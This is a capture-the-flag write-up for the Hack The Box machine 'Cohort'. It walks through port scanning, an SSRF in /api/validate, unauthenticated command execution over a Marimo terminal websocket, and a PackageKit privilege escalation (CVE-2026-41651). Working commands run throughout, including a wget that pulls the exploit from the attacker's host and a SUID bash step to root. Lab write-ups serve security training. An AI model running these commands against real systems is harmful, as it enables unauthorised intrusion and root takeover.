# HTB Cohort — Full Write-up

**Target:** `10.129.82.27`

## 1. Port scan

We started with:

```bash
sudo nmap -Pn -n -p- --min-rate 5000 10.129.82.27
```

Open ports:

```text
22/tcp
80/tcp
443/tcp
```

Service enumeration:

```bash
sudo nmap -Pn -n -sC -sV -p22,80,443 10.129.82.27
```

Results:

```text
22/tcp   OpenSSH 9.6p1
80/tcp   nginx 1.24.0
443/tcp  nginx 1.24.0
```

HTTP redirected to:

```text
https://cohort.htb/
```

## 2. Add the hostname

On Kali:

```bash
sudo sh -c 'echo "10.129.82.27 cohort.htb" >> /etc/hosts'
```

We checked:

```bash
curl -k -I https://cohort.htb/
```

and got:

```text
HTTP/1.1 200 OK
Server: nginx/1.24.0
Content-Type: text/html
```

The page was a JavaScript frontend.

## 3. SSRF endpoint

The useful API was:

```text
POST /api/validate
```

We tested:

```bash
curl -ksS -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  --data '{"url":"https://cohort.htb/status","format":"json"}'
```

The response revealed internal infrastructure:

```text
insights-api → 127.0.0.1:5000
notebooks → nb-1be3782a8afd3ad5.cohort.htb → 127.0.0.1:8888
```

The important discovery was:

```text
nb-1be3782a8afd3ad5.cohort.htb
```

## 4. SSRF to internal notebook service

The validator could be abused with:

```text
http://0.0.0.0/status
```

We added:

```bash
sudo sh -c 'echo "10.129.82.27 nb-1be3782a8afd3ad5.cohort.htb" >> /etc/hosts'
```

The hidden service returned a redirect to authentication:

```text
303 See Other
/auth/login
```

But authentication wasn't actually necessary for the vulnerable terminal endpoint.

## 5. Marimo terminal RCE

We connected directly to:

```text
wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

with:

```bash
wscat -n -c wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

We initially had trouble because the interactive `wscat` session echoed commands without showing the expected output.

The working approach was one-shot execution:

```bash
wscat -n -c \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -x $'id; whoami; hostname; pwd\n'
```

Result:

```text
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
marimo
cohort
/home/marimo
```

So we had command execution as `marimo`.

## 6. User flag

We retrieved:

```bash
wscat -n -c \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -x $'cat /home/marimo/user.txt\n'
```

Result:

```text
f4f6a9a6d07a150e5be726be8416d6d4
```

## 7. PackageKit discovery

From the Marimo shell:

```bash
pkcon --version
```

returned:

```text
1.2.8
```

This identified the vulnerable PackageKit version.

The root path used **CVE-2026-41651**, commonly referred to as Pack2TheRoot.

## 8. Obtain the exploit

On Kali we cloned the PoC:

```bash
cd ~/htb
git clone https://github.com/Vozec/CVE-2026-41651.git
cd CVE-2026-41651
```

The exploit binary was:

```text
cve-2026-41651
```

Our Kali VPN IP was:

```text
10.10.15.23
```

We hosted the exploit:

```bash
python3 -m http.server 8000
```

Then downloaded it through the Marimo shell:

```bash
wscat -n -c \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -x $'cd /tmp; wget http://10.10.15.23:8000/cve-2026-41651 -O pack2theroot; chmod +x pack2theroot\n'
```

Verified:

```bash
wscat -n -c \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -x $'ls -lh /tmp/pack2theroot\n'
```

Result:

```text
-rwxr-xr-x 1 marimo marimo 27K /tmp/pack2theroot
```

## 9. First exploit attempt

We ran:

```bash
wscat -n -c \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -x $'cd /tmp; ./pack2theroot\n'
```

The exploit created:

```text
/tmp/.pk-dummy-....
/tmp/.pk-payload-....
```

and printed:

```text
PK error 48: Failed to obtain authentication.
```

but then started polling.

Our problem was that `wscat -x` closed before the exploit had finished waiting for the payload.

## 10. Run exploit in background

We solved that with:

```bash
wscat -n -c \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -x $'cd /tmp; nohup ./pack2theroot >/tmp/pk.log 2>&1 &\n'
```

Then:

```bash
wscat -n -c \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -x $'cat /tmp/pk.log\n'
```

The log showed:

```text
[*] Polling for payload (120 s max)...
[*] t+1s: payload=exists dpkg_lock=free suid=FOUND
uid=1000(marimo) gid=1000(marimo) euid=0(root)

[+] SUCCESS — SUID bash at t+0ms
```

The exploit created:

```text
/tmp/.suid_bash
```

with:

```text
-rwsr-xr-x 1 root root ...
```

## 11. Root

We executed:

```bash
wscat -n -c \
  wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -x $'/tmp/.suid_bash -p -c "id; cat /root/root.txt"\n'
```

Result:

```text
uid=1000(marimo) gid=1000(marimo) euid=0(root)
```

and the root flag:

```text
2e0eb200f2f848fc5ab09f9f54fa0aa6
```

### Cohort chain

```text
cohort.htb
 ->
POST /api/validate
 ->
SSRF
 ->
0.0.0.0/status
 ->
hidden Marimo hostname
 ->
/terminal/ws
 ->
Marimo RCE
 ->
marimo user
 ->
PackageKit 1.2.8
 ->
CVE-2026-41651
 ->
SUID bash
 ->
euid=0
 ->
/root/root.txt
```
